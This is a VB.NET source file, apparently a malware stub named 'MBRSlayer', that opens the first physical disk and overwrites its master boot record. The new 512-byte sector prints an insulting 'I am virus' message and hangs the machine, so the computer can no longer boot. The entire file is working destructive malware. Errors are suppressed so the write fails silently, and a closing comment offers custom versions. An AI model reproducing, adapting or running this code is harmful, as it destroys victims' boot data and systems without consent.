Imports System
Imports System.Diagnostics
Imports System.Timers
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Collections.Generic
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography
Imports System.Windows.Forms
Imports System.Environment
Imports Stub
Imports System.Collections
Imports System.Text.RegularExpressions

Namespace Stub

    Public Class MBRSlayer
        <DllImport("kernel32")>
        Public Shared Function CreateFile(ByVal lpFileName As String, ByVal dwDesiredAccess As UInteger, ByVal dwShareMode As UInteger, ByVal lpSecurityAttributes As IntPtr, ByVal dwCreationDisposition As UInteger, ByVal dwFlagsAndAttributes As UInteger, ByVal hTemplateFile As IntPtr) As IntPtr

        End Function
        <DllImport("kernel32")>
        Public Shared Function WriteFile(ByVal hfile As IntPtr, ByVal lpBuffer As Byte(), ByVal nNumberOfBytesToWrite As UInteger, <Out> ByRef lpNumberBytesWritten As UInteger, ByVal lpOverlapped As IntPtr) As Boolean
        End Function

        Private Const GenericWrite As UInteger = &H40000000
        Private Const GenericExecute As UInteger = &H20000000
        Private Const GenericAll As UInteger = &H10000000
        Private Const FileShareRead As UInteger = &H1
        Private Const FileShareWrite As UInteger = &H2
        Private Const OpenExisting As UInteger = &H3
        Private Const FileFlagDeleteOnClose As UInteger = &H40000000
        Private Const MbrSize As UInteger = 512UI

        Public Shared Sub Start()
            On Error Resume Next
            Dim mbrData = New Byte() {&HEB, &H0, &H31, &HC0, &H8E, &HD8, &HFC, &HB8, &H12, &H0, &HCD, &H10, &HBE, &H24, &H7C, &HB3, &H3, &HE8, &H2, &H0, &HEB, &HFE, &HB7, &H0, &HAC, &H3C, &H0, &H74, &H6, &HB4, &HE, &HCD, &H10, &HEB, &HF5, &HC3, &H49, &H20, &H61, &H6D, &H20, &H76, &H69, &H72, &H75, &H73, &H21, &H20, &H46, &H75, &H63, &H6B, &H20, &H59, &H6F, &H75, &H20, &H3A, &H2D, &H29, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H55, &HAA}
            Dim mbr = MBRSlayer.CreateFile("\\.\PhysicalDrive0", GenericAll, FileShareRead Or FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero)
            Dim lpNumberOfBytesWritten As UInteger = Nothing
            MBRSlayer.WriteFile(mbr, mbrData, MbrSize, lpNumberOfBytesWritten, IntPtr.Zero)
        End Sub

        '----------------------------------------'
        ' MBR Overwriter by ChimesOfDestruction  '
        '                                        '
        ' If you want a custom message/overwrite '
        ' Open an  issue on my github page       '
        '----------------------------------------'
    End Class
End Namespace

